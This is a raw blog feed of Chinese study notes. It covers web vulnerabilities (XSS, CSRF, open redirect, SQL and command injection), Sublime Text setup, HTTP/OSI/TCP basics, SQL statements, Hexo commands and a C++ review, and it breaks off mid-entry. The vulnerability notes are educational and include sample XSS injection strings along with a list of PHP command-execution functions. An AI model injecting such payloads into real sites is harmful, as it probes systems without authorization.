      <content type="html"><![CDATA[<h1 id="XSS-漏洞（Cross-Site-Script-跨站脚本）"><a href="#XSS-漏洞（Cross-Site-Script-跨站脚本）" class="headerlink" title="XSS 漏洞（Cross Site Script | 跨站脚本）"></a>XSS 漏洞（Cross Site Script | 跨站脚本）</h1><p><strong>常见危害</strong>： 盗取用户信息，钓鱼，制造蠕虫等<br><strong>概念</strong>： 黑客通过“ Html 注入”篡改网页，插入了恶意脚本，当用户在浏览网页时，实现控制用户浏览器的一种攻击方式</p><blockquote><p>XSS 通常有三种类型：</p><ul><li><strong>存储型</strong>：访问网站，触发XSS。<br>firebug 的 html 中查找<br><strong>黑客端攻击流程</strong>： 构造带有 XSS 脚本的留言内容 –&gt; 提交给后端 web 应用程序 –&gt; web 应用程序将带有 XSS 脚本的留言写入数据库　–&gt; 用户或管理员查看留言触发 XSS<br><strong>用户端被攻击流程</strong>： 用户打开浏览器 –&gt; 访问了有 XSS 脚本的留言页面 –&gt; 浏览器请求内容 –&gt; 查询数据库 –&gt; 数据库将带有 XSS 脚本的留言返回给 web 应用程序 –&gt; 显示在用户的页面中触发 XSS<br>例：留言中加入 <code>&lt;img src=&quot;#&quot; onerrror=alert(/XSS/)&gt;</code></li><li><strong>反射性</strong>：访问携带 XSS 脚本的连接，触发 XSS<br><strong>用户端被攻击流程</strong>： 用户访问了有XSS脚本的链接 –&gt; 浏览器向后端的web应用程序发送请求 –&gt; 后端程序将 url 中的 XSS 脚本数据写入到响应页面并返回给浏览器 –&gt; 浏览器渲染响应页面触发 XSS<br>例： url 中携带 <code>&lt;img src=&quot;#&quot; onerror=&quot;alert=(/XSS/)&quot;&gt;</code></li><li><strong>DOM 型</strong>： 访问携带 XSS 脚本的链接，触发XSS<br>firebug 脚本中查找“ hash ”<br><strong>攻击过程</strong>： 用户在浏览器中访问携带XSS脚本的链接 –&gt; 浏览器通过 javascript 从 url 中提取出 XSS 脚本的内容并写入到 DOM 中 –&gt; 触发 XSS<br><img src="https://i.imgur.com/gj04WYf.png" alt=""></li></ul></blockquote><hr><h1 id="CSRF-漏洞（Cross-site-request-forgery-跨站请求伪造）"><a href="#CSRF-漏洞（Cross-site-request-forgery-跨站请求伪造）" class="headerlink" title="CSRF 漏洞（Cross-site request forgery | 跨站请求伪造）"></a>CSRF 漏洞（Cross-site request forgery | 跨站请求伪造）</h1><p><strong>常见危害</strong>： 执行恶意操作（“被转账”、“被发垃圾评论”），制造蠕虫等<br><strong>概念</strong>： 利用用户已登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作。<br><strong>原理</strong>：<br><img src="https://i.imgur.com/7aHZzgS.png" alt=""><br>在转账页面可能存在看不见的 iframe 标签，因为 width 和 height 为0</p><hr><h1 id="URL-跳转漏洞"><a href="#URL-跳转漏洞" class="headerlink" title="URL 跳转漏洞"></a>URL 跳转漏洞</h1><p><strong>概念</strong>： 借助未验证的 URL 跳转，将应用程序引导到不安全的第三方区域，从而导致安全问题<br><strong>例如</strong>：<br><img src="https://i.imgur.com/w1I7nhW.png" alt=""><br><strong>实现方式</strong>： </p><blockquote><ul><li>Header 头跳转<br><img src="https://i.imgur.com/Ej2XJoI.png" alt=""></li><li>JavaScript 跳转<br><img src="https://i.imgur.com/T5nKUkn.png" alt=""></li><li>Meta 跳转<br><img src="https://i.imgur.com/GVC9U4t.png" alt=""></li></ul></blockquote><hr><h1 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h1><p>SQL 注入是一种常见的Web安全漏洞，攻击者利用这个漏洞，可以进行访问或修改数据，或者利用潜在的数据库漏洞进行攻击<br><strong>SQL 注入的必备条件</strong></p><ul><li>1、可以控制输入的数据</li><li>2、服务器要执行的代码拼接了控制的数据<br><strong>SQL 注入的本质</strong><blockquote><p>数据和代码未分离，即数据当作了代码来执行</p></blockquote></li></ul><hr><h1 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h1><p><strong>命令注入要满足三个条件</strong>：</p><ul><li>1、调用可执行系统命令的函数</li><li>2、函数或函数的参数可控</li><li>3、拼接注入命令<br>PHP执行命令的函数：system, exec, shell_exec, eval ……<br>PHP执行系统命令的函数：<blockquote><p>system() 输出并返回最后一行shell结果。<br>exec() 不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面。<br>passthru() 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上。</p></blockquote></li></ul>]]></content>
      
      <categories>
          
          <category> Learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>submit text 3初始配置</title>
      <link href="/2018/07/13/submit-text-3%E5%88%9D%E5%A7%8B%E9%85%8D%E7%BD%AE/"/>
      <url>/2018/07/13/submit-text-3%E5%88%9D%E5%A7%8B%E9%85%8D%E7%BD%AE/</url>
      <content type="html"><![CDATA[<h1 id="submit-text-3安装PyV8"><a href="#submit-text-3安装PyV8" class="headerlink" title="submit text 3安装PyV8"></a>submit text 3安装PyV8</h1><pre><code>有时下载 Emmet 后，使用会报出关于 PyV8 的错误这时需要我们手动去安装 PyV8</code></pre><blockquote><ul><li>1、在github上下载需要的包：<a href="https://github.com/emmetio/pyv8-binaries#readme" target="_blank" rel="noopener">传送门</a></li><li>2、把下载的压缩包解压到如下路径：</li></ul></blockquote><p><center><img src="https://i.imgur.com/AKfoXiP.png" alt=""></center></p><blockquote><ul><li>3、重启submit text 3即可</li></ul></blockquote><hr><h1 id="submit-text-3在浏览器中预览html等文件"><a href="#submit-text-3在浏览器中预览html等文件" class="headerlink" title="submit text 3在浏览器中预览html等文件"></a>submit text 3在浏览器中预览html等文件</h1><blockquote><ul><li>1、安装插件：“view in browser”</li><li>2、打开：“Preferences-&gt;Key Bindings-User”，输入如下内容：<br><code>[    { &quot;keys&quot;: [&quot;ctrl+alt+f&quot;], &quot;command&quot;: &quot;open_in_browser&quot; },]</code></li></ul></blockquote><hr><h1 id="submit-text-3在指定路径下在浏览器中预览"><a href="#submit-text-3在指定路径下在浏览器中预览" class="headerlink" title="submit text 3在指定路径下在浏览器中预览"></a>submit text 3在指定路径下在浏览器中预览</h1><blockquote><ul><li>1、安装插件：“SideBarEnhancements”</li><li>2、打开：“Preference-&gt;Package Settings-&gt;Side Bar-&gt;Settings User-User”，添加如下：<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"default_browser"</span>: <span class="string">"chrome"</span> <span class="regexp">//</span>one <span class="keyword">of</span> <span class="keyword">this</span> list: firefox, aurora, chrome, canary, chromium, opera, safari</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></blockquote><blockquote><ul><li>3、在侧边栏右键，找到“Project-&gt;Edit Preview URLs”，添加如下：<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"项目路径"</span>:&#123;</span><br><span class="line">        <span class="attr">"url_testing"</span>: <span class="string">"localhost地址"</span>,</span><br><span class="line">        <span class="attr">"url_production"</span>: <span class="string">"线上地址"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></blockquote><blockquote><ul><li>4、打开：“Preference-&gt;Package Settings-&gt;Side Bar-&gt;key Bindings-User”，添加如下：<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">&#123;</span><br><span class="line">        <span class="attr">"keys"</span>: [<span class="string">"ctrl+shift+f"</span>],</span><br><span class="line">        <span class="attr">"command"</span>: <span class="string">"side_bar_open_in_browser"</span>,</span><br><span class="line">        <span class="attr">"args"</span>: &#123;</span><br><span class="line">                    <span class="attr">"paths"</span>: [],</span><br><span class="line">                    <span class="attr">"type"</span>: <span class="string">"testing"</span>,</span><br><span class="line">                    <span class="attr">"browser"</span>: <span class="string">""</span></span><br><span class="line">                &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li></ul></blockquote>]]></content>
      
      
        <tags>
            
            <tag> submit text 3 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>web基础知识</title>
      <link href="/2018/07/11/web%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>/2018/07/11/web%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      <content type="html"><![CDATA[<h1 id="Url组成"><a href="#Url组成" class="headerlink" title="Url组成"></a>Url组成</h1><center><img src="https://i.imgur.com/WJ0UKcd.png" alt=""></center><hr><h1 id="HTTP请求方式"><a href="#HTTP请求方式" class="headerlink" title="HTTP请求方式"></a>HTTP请求方式</h1><p><strong>HTTP协议中共定义了八种方法或者叫“动作”来表明对Request-URL制定的资源的不同操作方式，具体介绍如下：</strong></p><ul><li>1、OPTIONS: 返回服务器针对特定资源所支持的HTTP请求方法。也可以利用向Web服务器发送”*”的请求来测试服务器的功能性。</li><li>2、HEAD: 向服务器索要与个体请求相一致的响应，只不过响应将不会被返回。这一方法可以在不必传输整个响应内容的情况下，就可以获取包含在响应消息头中的<a href="https://baike.baidu.com/item/%E5%85%83%E4%BF%A1%E6%81%AF/7554993" target="_blank" rel="noopener">元信息</a>。</li><li>3、GET: 向特定的资源发出请求。</li><li>4、POST: 向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的创建和/或已有资源的修改。</li><li>5、PUT: 向指定资源位置上传其最新内容。</li><li>6、DELETE: 请求服务器删除Request-URL所标识的资源。</li><li>7、TRACE: 回显服务器收到的请求，主要用于测试或诊断。</li><li>8、CONNECT: HTTP/1.1协议中预留给能够将连接改为管道的代理服务器。</li></ul><p><font color="darkviolet" size="4"><center><strong>GET和POST的区别</strong></center></font></p><style>table th:first-of-type {width:10%;}</style><table><thead><tr><th style="text-align:center"></th><th style="text-align:center">GET</th><th style="text-align:center">POST</th></tr></thead><tbody><tr><td style="text-align:center">后退/刷新</td><td style="text-align:center">无害</td><td style="text-align:center">数据会被重新提交</td></tr><tr><td style="text-align:center">书签</td><td style="text-align:center">可收藏为书签</td><td style="text-align:center">不可收藏为书签</td></tr><tr><td style="text-align:center">缓存</td><td style="text-align:center">能被缓存</td><td style="text-align:center">不能缓存</td></tr><tr><td style="text-align:center">编码类型</td><td style="text-align:center">Application/x-www-form-urlencoded</td><td style="text-align:center">Application/x-www-form-urlencoded或multiparty/form-data。为二进制数据使用多重编码</td></tr><tr><td style="text-align:center">历史</td><td style="text-align:center">参数保存在浏览器历史中</td><td style="text-align:center">参数不会保存在浏览器历史中</td></tr><tr><td style="text-align:center">对数据长度的限制</td><td style="text-align:center">当发送数据时，GET方法向URL添加数据；URL的长度是受限制的（URL的最大长度是2048个字符）</td><td style="text-align:center">无限制</td></tr><tr><td style="text-align:center">对数据类型的限制</td><td style="text-align:center">只允许ASCII字符</td><td style="text-align:center">没有限制。也允许二进制数据</td></tr><tr><td style="text-align:center">安全性</td><td style="text-align:center">与POST相比，GET的安全性较差，因为所发送的数据是URL的一部分。所以在发送密码等                   敏感信息时绝不要使用GET。</td><td style="text-align:center">POST比GET更加安全，因为参数不会被保存在浏览器历史或web服务器日志中。</td></tr><tr><td style="text-align:center">可见性</td><td style="text-align:center">数据在URL中对所有人都都是可见的</td><td style="text-align:center">数据不会显示在URL中</td></tr></tbody></table><hr><h1 id="Javascript由哪几部分组成"><a href="#Javascript由哪几部分组成" class="headerlink" title="Javascript由哪几部分组成"></a>Javascript由哪几部分组成</h1><p>参考来源：<a href="https://www.jianshu.com/p/f6c94cfa3139" target="_blank" rel="noopener">https://www.jianshu.com/p/f6c94cfa3139</a></p><p>虽然JavaScript和ECMAScript通常被人用来表达相同的意思，但JavaScript的含义去比ECMA-262中规定的多得多。一个完整的JavaScript实现应由三个部分组成：</p><ul><li><p>1.<strong>核心（ECMAScript）</strong></p></li><li><p>2.<strong>文档对象模型（DOM）</strong></p></li><li><p>3.<strong>浏览器对象模型（BOM）</strong></p></li></ul><p><strong>核心（ECMAScript）</strong></p><p>由ECMA-262定义的ECMAScript是一种在国际认可的标准的脚本语言规范，与Web浏览器没有依赖关系。ECMA-262标准主要规定了这门语言由以下组成部分：</p><ul><li><p>1.语法</p></li><li><p>2.变量和数据类型</p></li><li><p>3.关键字和保留字</p></li><li><p>4.操作符</p></li><li><p>5.控制语句</p></li><li><p>6.对象</p></li></ul><p>2009年ECMAScript 5.0版正式发布。在很长一段时间，使用javaScript都是按照5.0的标准。2015年ECMAScript 6发布正式版本，官方称为ECMAScript 2015。ECMAScript定义了脚本语言的所有属性、方法和对象。因此抵用web客户端脚本编码时一定要遵循ECMAScript标准。</p><p><strong>文档对象模型（DOM）</strong></p><p>DOM（文档对象模型）是 HTML 和 XML 的应用程序接口（API）。DOM 将把整个页面规划成由节点层级构成的文档。HTML或XML页面中的每个组成部分都是某种类型的节点，这些节点又包含着不同类型的数据。</p><p><strong>浏览器对象模型（BOM）</strong></p><p>IE 3.0 和 Netscape Navigator 3.0 提供了一种特性 - BOM（浏览器对象模型），可以对浏览器窗口进行访问和操作。使用 BOM，开发者可以移动窗口、改变状态栏中的文本以及执行其他与页面内容不直接相关的操作。</p><hr><h1 id="OSI模型：（即开放式通信系统互联参考模型）"><a href="#OSI模型：（即开放式通信系统互联参考模型）" class="headerlink" title="OSI模型：（即开放式通信系统互联参考模型）"></a>OSI模型：（即开放式通信系统互联参考模型）</h1><p>OSI/RM协议是由IOS（国际标准化组织）制定的，他有三个基本功能：<strong>提供给开发者一个必须的、通用的概念以便开发完善、可以用来解释不同系统的框架</strong>。</p><p>OSI将计算机网络体结构划分为<strong>七层</strong>：</p><ol><li><p><strong>物理层</strong>：将数据转化为可通过物理介质传送的电子信号。相当于有剧中的搬运工人。<br>物理层规定了激活、维持、关闭通信端点之间的机械性、电气特性、功能特性以及过程特性。该层为上层协议提供了一个传输数据的物理媒体。<br>在这一层，数据单位为比特（bit）。<br>属于物理层定义的典范规范代表包括：EIA/TIA RS-232、EIA/TIA RS-449、V.35、RJ-45等。</p></li><li><p><strong>数据链路层</strong>：决定访问网络介质的方式。在此层将数据分帧，并处理流控制。本层指定拓补结构并提供硬件寻址。相当于邮局中的拆装箱工人。<br>数据链路层在不可靠的物理介质上提供可靠的传输。<br>该层的作用包括：物理地址寻址、数据的成帧、流量控制、数据的检错、重发等。<br>在这一层，数据的单位成为帧。<br>数据链路层协议的代表包括：SDLC、HDLC、PPP、STP、帧中继等。</p></li><li><p><strong>网络层</strong>：使用权数据路由经过大型网络。相当于邮局中的排序工人。<br>网络层负责对子网间的数据包进行路由选择。网络层还可以实现拥塞控制、网际互联等功能。<br>在这一层数据的单位成为数据包。<br>网络层协议的代表包括：IP、PX、IP、SPF、RP、ARP、CMP、MP等。</p></li><li><p><strong>传输层</strong>：提供终端到终端的可靠连接。相当于公司中跑邮局的送信职员。<br>传输层是第一个端到端，即主机到主机的层次。传输层负责将数据分段并提供端到端的、可靠的或不可靠的传输。此外，传输层还要处理端到端的差错控制和流量控制问题。<br>在这一层输局的单位称为数据端。<br>传输层协议的代表包括：TCP、UDP、SPX等。</p></li><li><p><strong>会话层</strong>：允许用户使用简单易记的名称建立连接。相当于公司中收寄信、写信封与拆信封的秘书。<br>会话层管理主机之间的会话进程即负责建立、管理、终止进程之间的会话。会话层还利用在数据中插入校验点来实现数据的同步。</p></li><li><p><strong>表示层</strong>：协商数据交换格式。相当于公司中简报老板、替老板写信的助理。<br>表示层对上层数据或信息进行变换以保证一个主机应用层的信息可以被另一个主机的应用程序理解。表示层的数据转换包括输局的加密、压缩、格式转换等。</p></li><li><p><strong>应用层</strong>：用户的应用程序和网络之间的接口老板。<br>应用层为操作系统或网络应用程序提供访问网络服务的接口。<br>应用层协议的代表包括：Telnet、FTP、HTTP、SNMP等。</p></li></ol><hr><h1 id="TCP三次握手，四次挥手"><a href="#TCP三次握手，四次挥手" class="headerlink" title="TCP三次握手，四次挥手"></a>TCP三次握手，四次挥手</h1><h2 id="TCP三次握手："><a href="#TCP三次握手：" class="headerlink" title="TCP三次握手："></a>TCP三次握手：</h2><p>第一次握手：客户端发送syn包（syn=x）到服务器，并进入到SYN_SEND状态，等待服务器确认。</p><p>第二次握手：服务器收到syn包，必须确认客户端的SYN（ack=x+1），同时自己也发送一个SYN包，即SYN+ACK包，此时服务器进入SYN_RECV状态。</p><p>第三次握手：客户端收到服务区的SYN+ACK包，向服务器发送确认包ACK（ack=y+1），此包发送完毕，客户端进入ESTABLISHED状态，完成三次握手。</p><p>握手构成中传送的包里不含数据，三次握手完毕后，客户端与服务器才正式开始传送数据。理想状态下，TCP连接一旦建立，在通信双方的任何一方主动关闭连接前，TCP链接都将被一直保持下去。<br>确认号：其数值等于发送方的发送序号+1（即接收方期望接受的下一个序列号）。</p><h2 id="TCP四次挥手："><a href="#TCP四次挥手：" class="headerlink" title="TCP四次挥手："></a>TCP四次挥手：</h2><p>第一次挥手：主动关闭方发送一个FIN，用来关闭主动方到被动关闭方的数据传送。</p><p>第二次挥手：被动关闭方收到FIN包后，发送一个ACK给对方，确认序号为收到序号+1（与SYN相同，一个FIN展映一个序号）。</p><p>第三次挥手：被动关闭方发送一个FIN，用来关闭被动关闭方到主动关闭方的数据传送，也就是告诉主动关闭方，我的数据也发送完了，不会再给你发送数据。</p><p>第四次挥手：主动关闭方收到一个FIN包后，发送一个ACK给被动关闭方，确认序号为收到序号+1，至此，完成四次挥手。<br><img src="https://i.imgur.com/KUMYzwx.png" alt=""></p><hr>]]></content>
      
      <categories>
          
          <category> Learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> Web </tag>
            
            <tag> url </tag>
            
            <tag> HTTP </tag>
            
            <tag> Javascript </tag>
            
            <tag> OSI模型 </tag>
            
            <tag> TCP三次握手，四次挥手 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SQL常用语句--增删改查</title>
      <link href="/2018/07/02/SQL%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5-%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/"/>
      <url>/2018/07/02/SQL%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5-%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/</url>
      <content type="html"><![CDATA[<h2 id="查"><a href="#查" class="headerlink" title="查"></a>查</h2><blockquote><p>查全部： <code>select * from &lt;tablename&gt;;</code><br>条件查询：<code>select &lt;filed&gt; from &lt;tablename&gt; where &lt;field&gt;=&lt;key&gt;;</code><br>带有函数查询： <code>select count(*) from &lt;tablename&gt;;</code><br>模糊查询： <code>select &lt;field&gt; from &lt;tablename&gt; where &lt;field&gt; like ‘%value%’;</code></p></blockquote><hr><h2 id="增"><a href="#增" class="headerlink" title="增"></a>增</h2><blockquote><p>添加库： <code>create database &lt;databasename&gt;;</code><br>创建新表： <code>create table &lt;tablename&gt; (col1 type1, col2, ...);</code><br>插入数据： <code>insert into &lt;tablename&gt;(field1,field2……) values(value1,value2………);</code><br>增加一列： <code>alter table &lt;tablename&gt; add column &lt;colname&gt; &lt;coltype&gt;;</code><br>添加主键： <code>alter table &lt;tablename&gt; add primary key(col);</code></p></blockquote><hr><h2 id="改"><a href="#改" class="headerlink" title="改"></a>改</h2><blockquote><p>更新： <code>update &lt;tablename&gt; set &lt;field&gt;=&lt;value&gt; where &lt;条件&gt;;</code></p></blockquote><hr><h2 id="删"><a href="#删" class="headerlink" title="删"></a>删</h2><blockquote><p>删除库： <code>drop database &lt;databasename&gt;;</code><br>删除表： <code>delete from &lt;tablename&gt; where &lt;条件&gt;;</code>（会留下日志文件，能被还原修复）<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>truncate table &lt;tablename&gt;;</code>（不会留下日志文件，不能被还原修复）</p></blockquote><hr><h2 id="子句："><a href="#子句：" class="headerlink" title="子句："></a>子句：</h2><blockquote><p>where子句：= , &gt; , &lt; , &lt;&gt;(不等于) , &gt;= , &lt;=<br>order by子句：asc (升序) , desc(降序)</p></blockquote><hr>]]></content>
      
      <categories>
          
          <category> Learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>网页返回上一页的几种方法</title>
      <link href="/2018/07/01/%E9%A1%B5%E8%BF%94%E5%9B%9E%E4%B8%8A%E4%B8%80%E9%A1%B5/"/>
      <url>/2018/07/01/%E9%A1%B5%E8%BF%94%E5%9B%9E%E4%B8%8A%E4%B8%80%E9%A1%B5/</url>
      <content type="html"><![CDATA[<h2 id="以按钮点击的方式实现"><a href="#以按钮点击的方式实现" class="headerlink" title="以按钮点击的方式实现"></a>以按钮点击的方式实现</h2><blockquote><p><code>&lt;input type=&quot;button&quot; name=&quot;Submit&quot; value=&quot;返回上一页&quot; onclick=&quot;javascript:window.history.back(-1);&quot;&gt;</code><br>或者<br><code>&lt;input type=&quot;button&quot; name=&quot;Submit&quot; value=&quot;返回上一页&quot; onclick=&quot;javascript:history.back(-1);&quot;&gt;</code></p></blockquote><hr><h2 id="一点击图片的方式实现"><a href="#一点击图片的方式实现" class="headerlink" title="一点击图片的方式实现"></a>一点击图片的方式实现</h2><blockquote><p><code>&lt;img src=&quot;图片的路径&quot; onclick=&quot;javascript:window.history.back(-1);&quot; title=&quot;返回上一页&quot; alt=&quot;返回点击图片&quot; /&gt;</code><br>或者<br><code>&lt;img src=&quot;图片的路径&quot; onclick=&quot;javascript:history.back(-1);&quot; title=&quot;返回上一页&quot; alt=&quot;返回点击图片&quot; /&gt;</code></p></blockquote><hr><h2 id="文字点击的方式实现"><a href="#文字点击的方式实现" class="headerlink" title="文字点击的方式实现"></a>文字点击的方式实现</h2><blockquote><p><code>&lt;a href=&quot;javascript:history.back(-1)&quot;&gt;返回上一页&lt;/a&gt;</code><br>或者<br><code>&lt;a href=&quot;#&quot; onClick=&quot;javascript:history.back(-1);&quot;&gt;返回上一页&lt;/a&gt;</code></p></blockquote><hr><h2 id="图片链接的方式实现"><a href="#图片链接的方式实现" class="headerlink" title="图片链接的方式实现"></a>图片链接的方式实现</h2><blockquote><p><code>&lt;a href=&quot;javascript:window.history.back(-1)&quot; target=&quot;_self&quot;&gt;&lt;img src=&quot;图片的路径&quot; /&gt;&lt;/a&gt;</code><br>或者<br><code>&lt;a href=&quot;javascript:history.back(-1)&quot; target=&quot;_self&quot;&gt;&lt;img src=&quot;图片的路径&quot; /&gt;&lt;/a&gt;</code></p></blockquote><hr><h2 id="过几秒钟后返回上一页"><a href="#过几秒钟后返回上一页" class="headerlink" title="过几秒钟后返回上一页"></a>过几秒钟后返回上一页</h2><blockquote><p><code>&lt;script language=&quot;javascript&quot;&gt;setTimeout(&quot;window.history.go(-1)&quot;,3000)&lt;/script&gt;</code><br>或者<br><code>&lt;script language=&quot;javascript&quot;&gt;setTimeout(&quot;history.go(-1)&quot;,3000)&lt;/script&gt;</code></p></blockquote><hr>]]></content>
      
      <categories>
          
          <category> Learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hexo常用命令</title>
      <link href="/2018/06/29/Hexo%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2018/06/29/Hexo%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      <content type="html"><![CDATA[<h1 id="hexo-s"><a href="#hexo-s" class="headerlink" title="hexo s"></a><strong>hexo s</strong></h1><blockquote><p><code>hexo s</code><br>hexo s 是 hexo serve 的缩写，用于本地预览： <a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a></p></blockquote><hr><h1 id="hexo-clean"><a href="#hexo-clean" class="headerlink" title="hexo clean"></a><strong>hexo clean</strong></h1><blockquote><p>清除缓存文件 db.json 和已生成的静态文件 public<br>网页异常清除缓存</p></blockquote><hr><h1 id="hexo-new"><a href="#hexo-new" class="headerlink" title="hexo new"></a>hexo new</h1><blockquote><p><code>hexo new 笔记名称</code><br>新建一篇标题为“笔记名称”的文章</p></blockquote><hr><h1 id="hexo-d"><a href="#hexo-d" class="headerlink" title="hexo d"></a>hexo d</h1><blockquote><p><code>hexo d</code><br>hexo d 是 hexo deploy 的缩写。<br>用于自动生成静态文件，并部署到仓库。</p></blockquote><hr><h1 id="hexo-g"><a href="#hexo-g" class="headerlink" title="hexo g"></a>hexo g</h1><blockquote><p><code>hexo g</code><br>hexo g 是 hexo generate 的缩写。<br>用于生成网站静态文件到默认的 public 文件夹。</p></blockquote><hr><h1 id="hexo-new-page"><a href="#hexo-new-page" class="headerlink" title="hexo new page"></a>hexo new page</h1><blockquote><p><code>hexo new page name</code><br>新建一个标题为 name 的页面，默认链接地址为/name/<br>页面不会出现在首页文章列表和归档中，也不支持分类和标签。</p></blockquote><hr>]]></content>
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>C++复习！！！（课本：谭老爷爷版）</title>
      <link href="/2018/06/24/c++%E5%A4%8D%E4%B9%A0/"/>
      <url>/2018/06/24/c++%E5%A4%8D%E4%B9%A0/</url>
      <content type="html"><![CDATA[<h3 id="一、从C到C"><a href="#一、从C到C" class="headerlink" title="一、从C到C++"></a><font color="DarkViolet"><center>一、从C到C++</center></font></h3><hr><h4 id="C-如何实现I-O？它的优势在哪里？"><a href="#C-如何实现I-O？它的优势在哪里？" class="headerlink" title="C++如何实现I/O？它的优势在哪里？"></a>C++如何实现I/O？它的优势在哪里？</h4><ul><li>1、c++中I/O的概念<blockquote><p>在c++中有一个<strong>stream</strong>，这个类，所有的I/O都以这个“流”为基础，包括我们认识的文件I/O。stream有两个重要的运算符:</p><ul><li>a、<strong>插入器（&lt;&lt;）</strong>：向流输入数据。</li><li>b、<strong>析取器（&gt;&gt;）</strong>：从流中读取数据。</li></ul></blockquote></li><li>2、与c语言相比之下的优势<blockquote><p>1、最大的好处时完成了对流操作的<strong>封装</strong>。原来文件操作都是一个个分开的函数，现在的操作都是对象的方法。<br>2、stream适用于设备输入和输出的。fstream是stream的派生类，即文件流（设备对象是文件），作为文件在c++中的一个抽象对象。</p></blockquote></li></ul><hr><h4 id="什么是重载函数？如何区分重载函数？"><a href="#什么是重载函数？如何区分重载函数？" class="headerlink" title="什么是重载函数？如何区分重载函数？"></a>什么是重载函数？如何区分重载函数？</h4><ul><li>1、什么是重载函数？<blockquote><p>c++允许在同一作用域中用同意函数名来定义多个函数，这些函数的参数个数和参数类型不相同，这些同名的函数用来实现不同的功能，这就是<strong>函数的重载</strong>，即一个<strong>函数名多用</strong>。</p></blockquote></li><li>2、区分函数重载<blockquote><ul><li>1、<strong>函数形参的个数</strong>；</li><li>2、<strong>函数形参的类型</strong>；</li><li>3、<strong>形参的顺序</strong>；</li><li>4、<strong>不能把返回值作为函数重载的条件</strong>，原因是编辑器在编译时不回去判断函数的返回类型，函数只有调用后，编译器才会去验证返回类型，所以返回值类型不能做为函数重载的依据；</li><li>5、<strong>常函数const可以作为函数重载的判断依据</strong>，原因：重载[]运算符时，有没有const的区别是：有const只读，没有const读写都可以。</li></ul></blockquote></li></ul><hr><h4 id="什么是函数模板？为什么要使用函数模板？"><a href="#什么是函数模板？为什么要使用函数模板？" class="headerlink" title="什么是函数模板？为什么要使用函数模板？"></a>什么是函数模板？为什么要使用函数模板？</h4><ul><li>1、什么是函数模板？<blockquote><p>建立一个通用函数，其函数类型和形参不具体指定，用一个虚函数的类型来代表，这个通用的函数就称为<strong>函数模板</strong>。</p><blockquote><p>例：max函数模板<br> <code>template&lt;typename T&gt;T max(T a, T b, T c) {}</code></p></blockquote></blockquote></li><li>2、为什么要使用函数模板？<blockquote><p><strong>简化</strong>对同名的知识形参类型不同的函数的定义。</p></blockquote></li></ul><hr><h4 id="使用带有默认参数的函数时，要注意些什么？"><a href="#使用带有默认参数的函数时，要注意些什么？" class="headerlink" title="使用带有默认参数的函数时，要注意些什么？"></a>使用带有默认参数的函数时，要注意些什么？</h4><ul><li><blockquote><p>1、如果函数的定义在函数调用之前，则应在函数定义中给出默认值。</p></blockquote></li><li><blockquote><p>2、一个函数不能既作为重载函数，又作为有默认参数的函数。</p></blockquote></li></ul><hr><h4 id="什么是变量的引用？要注意什么？"><a href="#什么是变量的引用？要注意什么？" class="headerlink" title="什么是变量的引用？要注意什么？"></a>什么是变量的引用？要注意什么？</h4><ul><li><blockquote><p>在c++中，变量的“引用”就是变量的别名，因此，<strong>引用</strong>又称<strong>别名</strong>。<br>建立“引用”的作用是为一个变量再起另一个名字，一边在需要时可以方便、间接地引用该变量。<br>对一个变量的“引用”的所有的操作，实际上都是对其所代表的（原来的）变量的操作。</p><blockquote><p>例：有一个变量a，想给他起一个别名b</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int a<span 